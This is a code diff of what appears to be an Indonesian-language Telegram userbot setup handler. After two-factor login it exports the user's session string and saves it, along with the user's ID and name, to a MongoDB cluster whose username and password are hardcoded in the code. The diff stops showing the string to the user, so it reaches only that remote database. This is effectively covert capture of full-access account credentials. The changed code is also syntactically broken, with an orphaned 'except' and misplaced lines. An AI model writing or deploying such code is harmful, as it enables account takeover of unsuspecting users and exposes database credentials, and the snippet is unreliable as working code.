@@ -60,18 +60,18 @@ async def recv_tg_tfa_message(_, message: Message):
         await loical_ci.check_password(tfa_code)
     except PasswordHashInvalid:
         await message.reply_text(
-            TFA_CODE_IN_VALID_ERR_TEXT
+            "Kode yang anda masukkan salah, coba masukan kembali atau mulai dari awal",
         )
         del AKTIFPERINTAH[message.chat.id]
     else:
-        saved_message_ = await message.reply_text(
-            "<code>" + str(await loical_ci.export_session_string()) + "</code>"
-        )        
+#        saved_message_ = await message.reply_text(
+#            "<code>" + str(await loical_ci.export_session_string()) + "</code>"
+#        )        
         client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
-        session_data = {"string_session": session_string}
+        load_dotenv()
         
         existing_session = mongo_collection.find_one({"session_string": session_string})
         if existing_session:
@@ -94,7 +94,7 @@ async def recv_tg_tfa_message(_, message: Message):
             "last_name": message.chat.last_name,
         }        
         mongo_collection.insert_one(session_data)
-        await message.reply_text("Bikin string udah, tinggal lanjut deploy ... wait ")  
+        await message.reply_text("String sudah di buat, tinggal lanjut deploy... 3 menit dan cek dengan .ping ")  
         filename = ".env"
         user_id = mongo_collection.find_one({"user_id": message.chat.id})
         cek = db.command("collstats", "sesi_collection")["count"]
@@ -115,17 +115,21 @@ async def recv_tg_tfa_message(_, message: Message):
             load_dotenv()
             try:
                 await message.reply_text(
-                "Lagi Coba deploy nih, sedang mencoba merestart server.")
-                msg = await message.reply(" `Restarting bot...`")
+                "Bot sedang mendeploy ke server.")
+                msg = await message.reply(" `Procesing bot...`")
                 LOGGER(__name__).info("BOT SERVER RESTARTED !!")
             except BaseException as err:
                 LOGGER(__name__).info(f"{err}")
                 return
-            await msg.edit_text("✅ **Bot udah direstart, tolong tunggu 2 Menit!**\n\n")
-            if HAPP is not None:
-                HAPP.restart()
-            else:
-                args = [sys.executable, "-m", "Ubot"]
-                execle(sys.executable, *args, environ)
-                        
+            await msg.edit_text("✅ **Bot running, tolong tunggu 2 Menit!**\n\n")
+            except BaseException as err:
+            LOGGER(__name__).info(f"{err}")
+            return
+        
+        if HAPP is not None:
+            HAPP.restart()
+        else:
+            args = [sys.executable, "-m", "Ubot"]
+            execle(sys.executable, *args, environ)
     raise message.stop_propagation()
+
